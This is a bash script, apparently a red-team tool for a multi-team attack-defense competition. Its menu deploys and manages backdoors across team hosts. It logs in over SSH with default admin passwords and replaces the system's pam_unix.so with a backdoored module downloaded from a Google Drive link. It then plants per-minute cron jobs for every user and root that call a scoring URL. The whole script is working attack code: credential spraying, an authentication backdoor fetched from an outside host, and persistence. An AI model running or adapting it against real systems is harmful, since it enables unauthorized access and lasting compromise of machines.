#!/bin/bash

IPs=()
network_id="10.20"
number_of_teams=10
host_ids=(111 121 131)
admins=("wburns" "cwray" "pnakasone")
default_password="Password1!"
timeout_duration=1
path_to_pam="/usr/lib/x86_64-linux-gnu/security"
backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
scoring_link="https://10.30.0.100/persist/team01"
touch backdoored_IPs.txt

send_backdoor() {
    for IP in "${IPs[@]}"; do
        for admin in "${admins[@]}"; do
            sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
                echo \"$default_password\" | sudo -S cp \"$path_to_pam/pam_unix.so\" \"$path_to_pam/.pam_unix.so.bak\"
                echo \"$default_password\" | sudo -S apt install curl -y
                echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
            "

            if [[ $? -eq 0 ]]; then
                echo "$IP" >> backdoored_IPs.txt
                echo "Backdoor successfully implanted at $IP"
                break
            fi
        done
    done
}

send_persistence() {
    read -p "Team to Send Persistence: " team_number
    read -p "Backdoor Password: " backdoor_password
    
    count=0
    while IFS= read -r IP; do
        team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)

        if [[ "$team_number_from_IP" == "$team_number" ]]; then
            sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "root@$IP" "
                echo \"$backdoor_password\" | sudo -S bash -c '
                    users=$(cut -d: -f1 /etc/passwd)

                    for user in \$users; do
                        bash -c \"(crontab -u \$user -l; echo \"* * * * * curl $scoring_link\") | crontab -u \$user -\"
                    done
    
                    echo \"* * * * * root curl $scoring_link\" | tee -a /etc/crontab
                    echo \"* * * * * root curl $scoring_link\" | tee /etc/cron.d/persistence_minute
                '
            "

            if [[ $? -eq 0 ]]; then
                count=$((count + 1))
                break
            fi
        fi
    done < backdoored_IPs.txt

    echo "Number of successful persistences: $count"
}

stop_persistence() {
    read -p "Team to Stop Persistence: " team_number
    
    count=0
    while IFS= read -r IP; do
        team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)

        if [[ "$team_number_from_IP" == "$team_number" ]]; then
            sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "root@$IP" "
                echo \"$default_password\" | sudo -S bash -c '
                    crontab -l | grep -v \"curl $scoring_link\" | crontab -

                    sed -i \"/curl $scoring_link/d\" /etc/crontab

                    rm -f /etc/cron.d/persistence_minute
                '
            "

            if [[ $? -eq 0 ]]; then
                count=$((count + 1))
                echo "Persistence successfully removed from $IP"
            fi
        fi
    done < backdoored_IPs.txt

    echo "Number of successful persistence removals: $count"
}

print_backdoored_IPs() {
    echo "Backdoored IPs:"
    cat backdoored_IPs.txt
}

print_unbackdoored_IPs() {
    echo "Unbackdoored IPs:"
    for IP in "${IPs[@]}"; do
        if ! grep -q "$IP" backdoored_IPs.txt; then
            echo "$IP"
        fi
    done
}

main() {
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done

    while true; do
        echo "DAKOTA CONQUEST SCRIPTS"
        echo "1. Send Backdoor"
        echo "2. Send Persistence"
        echo "3. Stop Sending Persistence"
        echo "4. Print Backdoored IPs"
        echo "5. Print Unbackdoored IPs"
        echo "6. Exit"
        read -p "Choose an option: " choice

        case $choice in
            1) send_backdoor ;;
            2) send_persistence ;;
            3) stop_persistence ;;
            4) print_backdoored_IPs ;;
            5) print_unbackdoored_IPs ;;
            6) break ;;
            *) echo "Invalid choice. Please try again." ;;
        esac
    done
}

main
